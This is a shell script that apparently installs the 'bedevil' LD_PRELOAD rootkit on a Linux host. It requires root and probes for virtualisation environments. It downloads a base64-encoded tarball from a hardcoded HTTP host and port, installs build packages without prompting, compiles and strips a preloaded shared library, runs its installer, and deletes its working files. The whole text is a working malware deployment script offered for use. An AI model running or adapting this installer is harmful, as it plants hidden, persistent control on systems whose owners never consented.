#!/bin/sh
[ -z "$1" ] && B64TARGZ_LOCATION="http://192.168.1.156:9001/super.b64" # changeme
WORKDIR="/tmp" # & mayb this.
[ `id -u` != 0 ] && exit; [ ! -e /proc ] && exit; [ ! -f /etc/ssh/sshd_config ] && echo "No sshd_config"; [ -d /proc/xen ] && echo "Xen environment detected"; [ -d /proc/vz ] && echo "OpenVZ environment detected"; [ -f /usr/bin/lveps ] && echo "CloudLinux LVE detected"; bin_path(){ echo -n `which $1 2>/dev/null || echo -n 'v'`; }; [ ! -f `bin_path gcc` ] && echo "GCC will be installed."; [ ! -f `bin_path base64` ] && { echo 'Missing base64 util?' && exit; }; [ ! -f `bin_path tar` ] && { echo 'Missing tar?' && exit; }; dlfile(){ if test "$DWNLDR" = "wget"; then DL_C="$DWNLDR -q $1 -O $2"; fi; if test "$DWNLDR" = "curl"; then DL_C="$DWNLDR -s $1 -o $2"; fi; $DL_C || { echo 'Failed downloading.'; rm -f $2; exit; }; }; _LOCATION="`printf "$B64TARGZ_LOCATION" | sed -e 's/^\(.\{4\}\).*/\1/'`"; if test "$_LOCATION" = "http"; then [ -f `bin_path wget` ] && DWNLDR='wget'; [ -f `bin_path curl` ] && DWNLDR='curl'; [ -z $DWNLDR ] && { echo 'Missing wget/curl.' && exit; }; fi; printf "\n\tBEGINNING.\n\n"; [ ! -z "$1" ] && mv "$1" $WORKDIR/; cd $WORKDIR; [ -z "$1" ] && B64TARGZ_FILENAME="`basename $B64TARGZ_LOCATION`"; [ ! -z "$1" ] && B64TARGZ_FILENAME="$1"; if test "$_LOCATION" = "http"; then echo "Downloading $B64TARGZ_FILENAME" && dlfile $B64TARGZ_LOCATION $B64TARGZ_FILENAME; fi; TARGZ_NAME="${B64TARGZ_FILENAME}.tar.gz"; echo "Extracting"; cat $B64TARGZ_FILENAME | base64 -d > $TARGZ_NAME || { echo "Couldn't b64" && rm -f $B64TARGZ_FILENAME $TARGZ_NAME; exit; }; [ ! -f $TARGZ_NAME ] && { echo "Target not found." && rm -f $B64TARGZ_FILENAME; exit; }; INCLUDE_DIR="`tar tzf $TARGZ_NAME | head -1 | cut -f1 -d"/"`"; tar xpfz $TARGZ_NAME >/dev/null; echo "Removing" && rm $TARGZ_NAME $B64TARGZ_FILENAME; [ ! -d "$INCLUDE_DIR" ] && { echo "Include dir not found."; rm -f $TARGZ_NAME $B64TARGZ_FILENAME; exit; }; BDVLSO="`sed '1q;d' $INCLUDE_DIR/settings.cfg`"; echo "Dependencies"; [ -f /usr/bin/yum ] && { for pkg in gcc libgcc.i686 glibc-devel.i686 glibc-devel pam-devel libpcap libpcap-devel; do yum -y install -e 0 $pkg; done; }; [ -f /usr/bin/pacman ] && { pacman -Syy; for pkg in glibc base-devel pam libpcap; do pacman -S $pkg; done; }; [ -f /usr/bin/apt-get ] && { if test "`uname -m | sed -e 's/^\(.\{4\}\).*/\1/'`" != "armv"; then dpkg --add-architecture i386; fi; apt-get -qq --yes --force-yes update; for pkg in gcc-multilib build-essential libpam0g-dev libpcap-dev libpcap0.8-dev; do apt-get -qq --yes --force-yes install $pkg; done; grep -i ubuntu /proc/version &>/dev/null && rm -f /etc/init/plymouth*; }; echo "Compiling"; LINKER_FLAGS="-ldl -lcrypt"; WARNING_FLAGS="-Wall"; OPTIMIZATION_FLAGS="-O0 -g0"; OPTIONS="-fomit-frame-pointer -fPIC"; LINKER_OPTIONS="-Wl,--build-id=none"; PLATFORM="`uname -m`"; _PLATFORM="`printf $PLATFORM | sed -e 's/^\(.\{4\}\).*/\1/'`"; if test "$_PLATFORM" = "armv"; then PLATFORM="`printf $PLATFORM | sed 's/.*\(...\)/\1/'`"; fi; gcc -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTIONS -I$INCLUDE_DIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $INCLUDE_DIR/$BDVLSO.$PLATFORM; gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTIONS -I$INCLUDE_DIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $INCLUDE_DIR/$BDVLSO.i686 2>/dev/null; strip $INCLUDE_DIR/$BDVLSO.$PLATFORM 2>/dev/null || { echo "Couldn't strip"; rm -rf $INCLUDE_DIR; exit; }; [ -f $INCLUDE_DIR/$BDVLSO.i686 ] && strip $INCLUDE_DIR/$BDVLSO.i686; LD_PRELOAD=$INCLUDE_DIR/$BDVLSO.$PLATFORM sh -c "./bdvinstall $INCLUDE_DIR/$BDVLSO.*"; rm -r $INCLUDE_DIR; exit;